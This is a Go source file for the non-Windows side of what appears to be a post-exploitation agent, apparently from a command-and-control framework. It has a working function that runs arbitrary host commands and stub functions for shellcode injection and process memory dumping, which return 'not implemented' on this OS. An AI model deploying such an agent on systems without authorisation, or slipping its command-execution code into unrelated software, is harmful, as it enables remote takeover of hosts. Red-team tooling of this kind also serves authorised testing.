// +build !windows

package agent

import (
	// Standard
	"errors"
	"fmt"
	"os/exec"

	// 3rd Party
	"github.com/mattn/go-shellwords"
)

// ExecuteCommand is function used to instruct an agent to execute a command on the host operating system
func ExecuteCommand(name string, arg string) (stdout string, stderr string) {
	var cmd *exec.Cmd

	argS, errS := shellwords.Parse(arg)
	if errS != nil {
		return "", fmt.Sprintf("There was an error parsing command line argments: %s\r\n%s", arg, errS.Error())
	}

	cmd = exec.Command(name, argS...) // #nosec G204

	out, err := cmd.CombinedOutput()
	stdout = string(out)
	stderr = ""

	if err != nil {
		stderr = err.Error()
	}

	return stdout, stderr
}

// ExecuteShellcodeSelf executes provided shellcode in the current process
//lint:ignore SA4009 Function needs to mirror exec_windows.go and inputs must be used
func ExecuteShellcodeSelf(shellcode []byte) error {
	shellcode = nil
	return errors.New("shellcode execution is not implemented for this operating system")
}

// ExecuteShellcodeRemote executes provided shellcode in the provided target process
//lint:ignore SA4009 Function needs to mirror exec_windows.go and inputs must be used
func ExecuteShellcodeRemote(shellcode []byte, pid uint32) error {
	shellcode = nil
	pid = 0
	return errors.New("shellcode execution is not implemented for this operating system")
}

// ExecuteShellcodeRtlCreateUserThread executes provided shellcode in the provided target process using the Windows RtlCreateUserThread call
//lint:ignore SA4009 Function needs to mirror exec_windows.go and inputs must be used
func ExecuteShellcodeRtlCreateUserThread(shellcode []byte, pid uint32) error {
	shellcode = nil
	pid = 0
	return errors.New("shellcode execution is not implemented for this operating system")
}

// ExecuteShellcodeQueueUserAPC executes provided shellcode in the provided target process using the Windows QueueUserAPC API call
//lint:ignore SA4009 Function needs to mirror exec_windows.go and inputs must be used
func ExecuteShellcodeQueueUserAPC(shellcode []byte, pid uint32) error {
	shellcode = nil
	pid = 0
	return errors.New("shellcode execution is not implemented for this operating system")
}

// miniDump is a Windows only module function to dump the memory of the provided process
//lint:ignore SA4009 Function needs to mirror exec_windows.go and inputs must be used
func miniDump(tempDir string, process string, inPid uint32) (map[string]interface{}, error) {
	var mini map[string]interface{}
	tempDir = ""
	process = ""
	inPid = 0
	return mini, errors.New("minidump doesn't work on non-windows hosts")
}
